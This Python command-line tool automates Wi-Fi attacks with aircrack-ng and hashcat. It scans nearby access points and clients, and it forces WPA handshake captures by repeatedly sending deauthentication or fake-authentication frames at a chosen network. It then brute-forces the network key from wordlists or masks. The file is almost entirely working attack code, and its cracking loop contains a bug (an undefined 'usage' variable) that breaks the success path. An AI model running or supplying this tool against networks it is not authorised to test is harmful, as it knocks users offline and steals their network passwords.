from __future__ import annotations
import argparse
import dataclasses
import enum
import json
import os
from pathlib import Path
import shutil
import sys
import tempfile
import time

from tools.aircrack import Aircrack
from tools.aireplay import fakeauth, deauth
from tools.airmon import monitoring_session
from tools.airodump import AccessPoint, Station, Dump
from tools.cap2hccapx import convert_aircrack_capture_to_hashcat_format
from tools.file import is_text_file
from tools.hashcat import Hashcat
from utils.dumping import get_table, get_dataclass_getter


"""
    Dumping access points and stations
"""

ACCESS_POINT_COLUMNS = {
    "": 2, # Extra field that shows that this access point has stations
    "BSSID": 19,
    "PWR": 5,
    "Beacons": 11,
    "#Data,": 7,
    "#/s": 4,
    "CH": 5,
    "MB": 5,
    "ENC": 5,
    "CIPHER": 7,
    "AUTH": 5,
    "ESSID": 0,
}


STATION_COLUMNS = {
    "BSSID": 19,
    "STATION": 19,
    "PWR": 7,
}


def _get_access_point_getter(stations: dict[str, Station]):
    get_extra_field = lambda access_point: '*' if access_point.bssid in stations else ' '
    return lambda access_point: [get_extra_field(access_point)] + list(get_dataclass_getter()(access_point))


def _get_lines(access_points: dict[str, AccessPoint],
               stations: dict[str, Station]) -> list[str]:
    lines = []

    keys = sorted(access_points.keys(), key=lambda key: access_points[key].power, reverse=True)
    lines.extend(get_table(access_points, _get_access_point_getter(stations), keys, ACCESS_POINT_COLUMNS))

    lines.append("")

    keys = stations.keys()
    lines.extend(get_table(stations, get_dataclass_getter(), keys, STATION_COLUMNS))

    lines.append("")

    return lines


def _dump(dump: Dump,
          monitoring_time_sec: int,
          output_file_path: Path | None,
          hide_if_no_stations: bool):
    print("Please wait...")
    time.sleep(monitoring_time_sec)

    access_points, stations = dump.get_snapshot()

    if hide_if_no_stations:
        access_points = {key: value for key, value in access_points.items() if key in stations}

    lines = _get_lines(access_points, stations)
    text = '\n'.join(lines)

    if output_file_path:
        with output_file_path.open("w") as output_file:
            output_file.write(text)

    sys.stdout.write(text)


def dump(iface: str, *args):
    with monitoring_session(iface) as monitoring_iface:
        with Dump(monitoring_iface) as dump:
            _dump(dump, *args)


"""
    Handshaking
"""

def _get_capture_file_path(dir: Path) -> Path:
    paths = list(dir.glob("*.cap"))
    if len(paths) != 1:
        raise RuntimeError(f"Expected one .cap file, but got {paths}")

    return paths[0]


def _is_handshake_accepted(dir: Path) -> bool:
    path = _get_capture_file_path(dir)
    return Aircrack.is_capture_file_ok(path)


def _handshake(dump: Dump,
               strategy: str,
               bssid: str,
               output_dir: Path):
    while not dump.has_handshake() or not _is_handshake_accepted(output_dir):
        time.sleep(10)

        access_points, stations = dump.get_snapshot()

        if bssid not in access_points:
            continue

        if strategy == "fakeauth":
            fakeauth(dump.monitoring_iface, bssid)

        elif strategy == "deauth":
            if len(stations) == 0:
                # Broadcast (not effective)
                deauth(dump.monitoring_iface, bssid)

            else:
                for station in stations.values():
                    if station.bssid != bssid:
                        raise RuntimeError(f"Unexpected station: {station}")

                    deauth(dump.monitoring_iface, bssid, dmac=station.station)


def _get_dump_output_dir(bssid: str, basic_output_dir: Path) -> Path:
    bssid = bssid.replace(":", "")
    bssid = bssid.lower()

    return basic_output_dir / bssid


def handshake(iface: str,
              strategy: str,
              channel: int,
              bssid: str,
              basic_output_dir: Path):
    with monitoring_session(iface) as monitoring_iface:
        output_dir =_get_dump_output_dir(bssid, basic_output_dir)
        os.makedirs(output_dir, exist_ok=True)

        with tempfile.TemporaryDirectory(dir=output_dir) as temporary_dir:
            temporary_dir = Path(temporary_dir)
            dump_prefix = str(temporary_dir / "dump")

            with Dump(monitoring_iface, channel=channel, bssid=bssid, dump_prefix=dump_prefix) as dump:
                _handshake(dump, strategy, bssid, temporary_dir)

            print("Got a handshake!")

            # This capture has a handshake, it can be stored to `output_dir`
            for path in temporary_dir.glob("*"):
                shutil.copy(path, output_dir)


"""
    Creating a tasks config file
"""

WORDLIST_GLOB_PATTERNS = [
    "*list*",
    "*.txt",
    "*.lst",
    "*.list",
]


def _scan_worldlists(wordlists: list[Path], wordlist_dirs: list[Path]) -> dict[Path, int]:
    wordlists = dict.fromkeys(wordlists)

    for dir in wordlist_dirs:
        for pattern in WORDLIST_GLOB_PATTERNS:
            for wordlist in dir.rglob(pattern, case_sensitive=False):
                wordlist = Path(wordlist)

                if not wordlist.is_file():
                    continue

                wordlists[wordlist] = None

    for wordlist in wordlists.keys():
        file_size = wordlist.stat().st_size
        wordlists[wordlist] = file_size

    return wordlists


def _filter_wordlists(wordlists: dict[Path, int]) -> dict[Path, int]:
    filtered_wordlists = {}

    for wordlist, file_size in wordlists.items():
        if file_size == 0:
            print(f"Skipped empty wordlist {wordlist}")
            continue

        if not is_text_file(wordlist):
            print(f"Skipped binary file {wordlist}")
            continue

        filtered_wordlists[wordlist] = file_size

    return filtered_wordlists


def _sort_wordlists(wordlists: dict[Path, int]) -> dict[Path, int]:
    sorted_wordlists = {}

    sorted_keys = sorted(wordlists.keys(), key=lambda key: wordlists[key], reverse=True)
    for key in sorted_keys:
        sorted_wordlists[key] = wordlists[key]

    return sorted_wordlists


class TaskKind(enum.StrEnum):
    MASK = 'mask'
    WORDLIST = 'wordlist'

    def serialize(self, attrs: str | None = None) -> str:
        text = self.value

        if attrs:
            text += ' ' + attrs

        return text

    @staticmethod
    def deserialize(text: str) -> tuple[TaskKind, str | None]:
        tokens = text.split(maxsplit=1)
        kind = tokens[0]
        attrs = tokens[1] if len(tokens) > 1 else None
        return TaskKind(kind), attrs


def create_tasks_config_file(wordlists: list[Path],
                             wordlist_dirs: list[Path],
                             masks: list[str],
                             output: Path):
    if len(wordlist_dirs) > 0:
        print("Please wait...")

    wordlists = _scan_worldlists(wordlists, wordlist_dirs)
    wordlists = _filter_wordlists(wordlists)
    wordlists = _sort_wordlists(wordlists)

    print(f"{len(wordlists)} potential worldlist(s) found (you may need to clean wordlists manually)")

    tasks = {}
    for mask in masks:
        tokens = mask.split(',')
        mask = tokens[0]
        extra_args = tokens[1:]

        attrs = ' '.join(extra_args) if len(extra_args) > 0 else None
        tasks[mask] = TaskKind.MASK.serialize(attrs)

    print(f"{len(masks)} mask(s) added")

    for wordlist, file_size in wordlists.items():
        tasks[str(wordlist)] = TaskKind.WORDLIST.serialize(f"({file_size} bytes)")

    with output.open("w") as file:
        json.dump(tasks, file, indent=4)


"""
    Cracking
"""

@dataclasses.dataclass
class TaskInfo:
    kind: TaskKind
    extra_args: list[str]
    usage: int

    @staticmethod
    def deserialize(text: str) -> TaskInfo:
        kind, attrs = TaskKind.deserialize(text)

        extra_args = []
        if kind == TaskKind.MASK and attrs:
            extra_args = attrs.split()

        return TaskInfo(kind, extra_args, usage=0)


def _get_tasks_from_config(path: Path) -> dict[str, TaskInfo]:
    with path.open("r") as file:
        raw_tasks = json.load(file)

    return {key: TaskInfo.deserialize(value) for key, value in raw_tasks.items()}


def _update_task_usage_statistics(path: Path, tasks: dict[str, TaskInfo]):
    if not path.exists():
        return

    with path.open("r") as file:
        tasks_usage_table = json.load(file)

    for task, usage in tasks_usage_table.items():
        if task not in tasks:
            # The statistics file, unlike the config file, isn't supposed to be edited manually (but
            # it's possible), so it can have wordlists or masks that are no longer in the config file
            print(f"Ignore not known task {task} from {path}")
            continue

        tasks[task].usage = usage


def _store_task_usage_statistics(path: Path, tasks: dict[str, TaskInfo]):
    tasks_usage_table = {key: value.usage for key, value in tasks.items()}

    with path.open("w") as file:
        json.dump(tasks_usage_table, file, indent=4)


def _crack(tool_cls,
           capture_file_path: Path,
           *,
           wordlist_file_path: Path | None,
           mask: str | None,
           extra_args: list[str]) -> str | None:
    what = str(wordlist_file_path or mask)
    what = what + (' '.join(extra_args) if len(extra_args) > 0 else '')
    print(f"Trying to crack {str(capture_file_path)} by '{what}'...")

    with tool_cls(capture_file_path,
                  wordlist_file_path=wordlist_file_path,
                  mask=mask,
                  extra_args=extra_args) as tool:
        while True:
            key = tool.get_key_if_found()
            if key:
                print(f"\x1b[2KFound key: '{key}'!") # FIXME
                return key

            exit_info = tool.get_exit_info()
            if exit_info is not None:
                if exit_info.is_error:
                    print(f"\x1b[2KFailed to crack: {exit_info.returncode}") # FIXME
                else:
                    print("\x1b[2KKey is not found", end='\r', flush=True) # FIXME
                return None

            info = tool.get_progress_info()
            if not info.last_passphrase:
                time.sleep(0.5)
                continue

            line = f"\x1b[2KLast passphase: '{info.last_passphrase}'"

            if info.speed:
                line += ", speed: " + info.speed

            if info.percentage:
                line += ", done: " + info.percentage

            line += ", keep searching..."

            print(line, end='\r', flush=True) # FIXME
            time.sleep(1)


def crack(aircrack_capture_file_path: Path,
          tasks_config_file_path: Path,
          statistics_file_path: Path,
          prefer_aircrack: bool):
    tasks = _get_tasks_from_config(tasks_config_file_path)
    _update_task_usage_statistics(statistics_file_path, tasks)

    has_masks = any(info.kind == TaskKind.MASK for info in tasks.values())

    # `aircrack-ng` only works with wordlists
    if not prefer_aircrack or has_masks:
        hashcat_capture_file_path = aircrack_capture_file_path.with_suffix(".hccapx")
        convert_aircrack_capture_to_hashcat_format(aircrack_capture_file_path, hashcat_capture_file_path)

    key = None

    for task, info in tasks.items():
        if prefer_aircrack and info.kind == TaskKind.WORDLIST:
            tool_cls = Aircrack
            capture_file_path = aircrack_capture_file_path

        else:
            tool_cls = Hashcat
            capture_file_path = hashcat_capture_file_path

        wordlist_file_path = Path(task) if info.kind == TaskKind.WORDLIST else None
        mask = task if info.kind == TaskKind.MASK else None

        key = _crack(tool_cls,
                     capture_file_path,
                     wordlist_file_path=wordlist_file_path,
                     mask=mask,
                     extra_args=info.extra_args)
        if key:
            usage = usage + 1
            tasks[task] = usage
            break

    if not key:
        print("Key is not found")

    _store_task_usage_statistics(statistics_file_path, tasks)


"""
    CLI
"""

def on_dump(args: argparse.Namespace):
    dump(args.iface, args.sec, args.output, args.hide_if_no_stations)


def on_handshake(args: argparse.Namespace):
    handshake(args.iface, args.strategy, args.channel, args.bssid, args.output_dir)


def on_tasks(args: argparse.Namespace):
    create_tasks_config_file(args.wordlist, args.wordlist_dir, args.mask, args.output)


def on_crack(args: argparse.Namespace):
    crack(args.capture, args.tasks, args.statistics, args.prefer_aircrack)


def main():
    parser = argparse.ArgumentParser()

    subparsers = parser.add_subparsers(dest='command')

    dump_parser = subparsers.add_parser("dump",
                                        help="Dump access points and stations")
    dump_parser.add_argument("iface",
                             help="Wireless iface for monitoring")
    dump_parser.add_argument("--sec",
                             help="Time to monitor",
                             type=int,
                             default=10)
    dump_parser.add_argument("--output",
                             help="Dump the table to a file",
                             type=Path)
    dump_parser.add_argument("--hide_if_no_stations",
                             help="Filter out access points without stations",
                             action='store_true')
    dump_parser.set_defaults(handler=on_dump)

    handshake_parser = subparsers.add_parser("handshake",
                                             help="Get a handshake")
    handshake_parser.add_argument("iface",
                                  help="Wireless iface for monitoring")
    handshake_parser.add_argument("strategy",
                                  help="Strategy for `aireplay-ng`") # FIXME
    handshake_parser.add_argument("--channel",
                                  help="Channel of an access point",
                                  type=int,
                                  required=True)
    handshake_parser.add_argument("--bssid",
                                  help="Mac address of an access point",
                                  required=True)
    handshake_parser.add_argument("--output_dir",
                                  help="Basic directory where dump files should be stored",
                                  type=Path,
                                  required=True)
    handshake_parser.set_defaults(handler=on_handshake)

    tasks_parser = subparsers.add_parser("tasks")
    tasks_parser.add_argument("--wordlist",
                              help="Wordlist to add",
                              type=Path,
                              action='append',
                              default=[])
    tasks_parser.add_argument("--wordlist_dir",
                              help="Directory to scan for wordlists",
                              type=Path,
                              action='append',
                              default=[])
    tasks_parser.add_argument("--mask",
                              help="Brute-force attack mask",
                              action='append',
                              default=[])
    tasks_parser.add_argument("--output",
                              help="Config file to create",
                              type=Path,
                              required=True)
    tasks_parser.set_defaults(handler=on_tasks)

    crack_parser = subparsers.add_parser("crack",
                                         help="Crack an access point using a captured handshake")
    crack_parser.add_argument("--capture",
                              help="Input .cap file",
                              type=Path,
                              required=True)
    crack_parser.add_argument("--tasks",
                              help="Tasks config file (created by `tasks` command)",
                              type=Path,
                              required=True)
    crack_parser.add_argument("--statistics",
                              help="Task statistics file (will create a new one if it not exists)",
                              type=Path,
                              required=True)
    crack_parser.add_argument("--prefer_aircrack",
                              action='store_true')
    crack_parser.set_defaults(handler=on_crack)

    args = parser.parse_args()

    if args.command == None:
        parser.error("Please specify a command")

    args.handler(args)


if __name__ == "__main__":
    main()
